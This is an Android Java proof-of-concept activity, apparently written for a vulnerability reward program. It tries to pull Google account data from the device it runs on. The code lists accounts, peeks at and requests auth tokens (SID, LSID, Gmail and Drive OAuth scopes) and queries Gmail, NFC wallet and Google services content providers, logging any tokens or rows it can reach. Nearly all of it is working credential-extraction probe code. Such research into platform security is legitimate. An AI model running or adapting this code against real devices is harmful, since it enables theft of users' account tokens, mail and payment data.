package com.vrp.poc;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.accounts.AccountManagerCallback;
import android.accounts.AccountManagerFuture;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class AccountTokenPocActivity extends Activity {
    private static final String TAG = "AccountTokenPoc";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(8);
        logView.setText("Account & Token Extraction PoC\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        testAccountEnumeration();
        testTokenExtraction();
        testGmailProviders();
        testNfcWalletProviders();
        testGmsProviders();
        log("\n=== ALL TESTS COMPLETE ===");
    }

    private void testAccountEnumeration() {
        log("=== TEST 1: Account Enumeration ===");
        try {
            AccountManager am = AccountManager.get(this);
            Account[] accounts = am.getAccounts();
            log("Total accounts: " + accounts.length);
            for (Account a : accounts) {
                log("  Account: " + a.name + " type=" + a.type);
            }

            Account[] googleAccounts = am.getAccountsByType("com.google");
            log("\nGoogle accounts: " + googleAccounts.length);
            for (Account a : googleAccounts) {
                log("  Google: " + a.name);
                String prevToken = am.peekAuthToken(a, "oauth2:email");
                log("  Peek oauth2:email: " + (prevToken != null ? "GOT TOKEN!" : "null"));
                prevToken = am.peekAuthToken(a, "SID");
                log("  Peek SID: " + (prevToken != null ? "GOT TOKEN!" : "null"));
                prevToken = am.peekAuthToken(a, "LSID");
                log("  Peek LSID: " + (prevToken != null ? "GOT TOKEN!" : "null"));
            }
        } catch (SecurityException e) {
            log("BLOCKED: " + e.getMessage());
        } catch (Exception e) {
            log("Error: " + e.getClass().getSimpleName() + ": " + shorten(e.getMessage()));
        }
    }

    private void testTokenExtraction() {
        log("\n=== TEST 2: Token Extraction Attempts ===");
        AccountManager am = AccountManager.get(this);
        Account[] googleAccounts = am.getAccountsByType("com.google");
        if (googleAccounts.length == 0) {
            log("No Google accounts found");
            return;
        }
        Account target = googleAccounts[0];
        log("Target: " + target.name);

        String[] tokenTypes = {
            "oauth2:email",
            "oauth2:profile",
            "oauth2:https://www.googleapis.com/auth/userinfo.email",
            "SID", "LSID", "AUTH",
            "oauth2:https://www.googleapis.com/auth/drive",
            "oauth2:https://mail.google.com/",
            "weblogin:service=lso&source=ogb"
        };

        for (String tokenType : tokenTypes) {
            try {
                AccountManagerFuture<Bundle> future = am.getAuthToken(
                    target, tokenType, null, this, null, null);
                Bundle result = future.getResult(5, java.util.concurrent.TimeUnit.SECONDS);
                if (result != null) {
                    String token = result.getString(AccountManager.KEY_AUTHTOKEN);
                    if (token != null) {
                        log("  [GOT TOKEN] " + tokenType + ": " + token.substring(0, Math.min(20, token.length())) + "...");
                    } else {
                        Intent intent = result.getParcelable(AccountManager.KEY_INTENT, Intent.class);
                        if (intent != null) {
                            log("  [NEEDS UI] " + tokenType + ": requires user approval");
                        } else {
                            log("  [NO TOKEN] " + tokenType);
                        }
                    }
                }
            } catch (android.accounts.OperationCanceledException e) {
                log("  [CANCELLED] " + tokenType);
            } catch (android.accounts.AuthenticatorException e) {
                log("  [AUTH_ERR] " + tokenType + ": " + shorten(e.getMessage()));
            } catch (Exception e) {
                log("  [ERROR] " + tokenType + ": " + e.getClass().getSimpleName());
            }
        }
    }

    private void testGmailProviders() {
        log("\n=== TEST 3: Gmail Provider Access ===");
        String[] uris = {
            "content://com.android.gmail.ui/account",
            "content://com.android.gmail.ui/accounts",
            "content://com.android.gmail.uiinternal",
            "content://gmail-ls/conversations",
        };
        for (String uri : uris) {
            try {
                Cursor c = getContentResolver().query(Uri.parse(uri), null, null, null, null);
                if (c != null) {
                    log("[ACCESSIBLE] " + uri + " rows=" + c.getCount() + " cols=" + c.getColumnCount());
                    if (c.getCount() > 0 && c.moveToFirst()) {
                        StringBuilder sb = new StringBuilder();
                        for (int i = 0; i < Math.min(c.getColumnCount(), 5); i++) {
                            try { sb.append(c.getColumnName(i) + "=" + c.getString(i) + ", "); } catch (Exception ignored) {}
                        }
                        log("  Data: " + sb);
                    }
                    c.close();
                } else {
                    log("[NULL] " + uri);
                }
            } catch (SecurityException e) {
                log("[DENIED] " + uri);
            } catch (Exception e) {
                log("[ERROR] " + uri + ": " + e.getClass().getSimpleName());
            }
        }
    }

    private void testNfcWalletProviders() {
        log("\n=== TEST 4: NFC/Wallet Access ===");
        String[] uris = {
            "content://com.google.android.apps.walletnfcrel",
            "content://nfc_payment",
            "content://com.google.android.gms.tapandpay",
        };
        for (String uri : uris) {
            try {
                Cursor c = getContentResolver().query(Uri.parse(uri), null, null, null, null);
                if (c != null) {
                    log("[ACCESSIBLE] " + uri + " rows=" + c.getCount());
                    c.close();
                } else {
                    log("[NULL] " + uri);
                }
            } catch (SecurityException e) {
                log("[DENIED] " + uri);
            } catch (Exception e) {
                log("[ERROR] " + uri + ": " + e.getClass().getSimpleName());
            }
        }

        try {
            log("\n--- Test NFC default payment app query ---");
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.settings.slices/action/nfc_default_payment_app"),
                null, null, null, null
            );
            if (c != null) {
                log("NFC default payment: " + c.getCount() + " rows");
                if (c.moveToFirst()) {
                    for (int i = 0; i < c.getColumnCount(); i++) {
                        try { log("  " + c.getColumnName(i) + " = " + c.getString(i)); } catch (Exception ignored) {}
                    }
                }
                c.close();
            }
        } catch (Exception e) {
            log("NFC payment slice: " + e.getClass().getSimpleName());
        }
    }

    private void testGmsProviders() {
        log("\n=== TEST 5: GMS Provider Scan ===");
        String[] uris = {
            "content://com.google.android.gms.phenotype/com.google.android.gms",
            "content://com.google.android.gms.phenotype/flags",
            "content://com.google.android.gms.auth.accounts",
            "content://com.google.android.gms.car",
            "content://com.google.android.gms.nearby",
            "content://com.google.android.gms.fitness",
            "content://com.google.android.gms.people",
            "content://com.google.android.gms.wearable",
        };
        for (String uri : uris) {
            try {
                Cursor c = getContentResolver().query(Uri.parse(uri), null, null, null, null);
                if (c != null) {
                    log("[ACCESSIBLE] " + uri + " rows=" + c.getCount());
                    c.close();
                } else {
                    log("[NULL] " + uri);
                }
            } catch (SecurityException e) {
                log("[DENIED] " + uri.substring(Math.max(0, uri.length()-40)));
            } catch (Exception e) {
                log("[ERROR] " + uri.substring(Math.max(0, uri.length()-40)) + ": " + e.getClass().getSimpleName());
            }
        }
    }

    private String shorten(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) + "..." : s;
    }
}
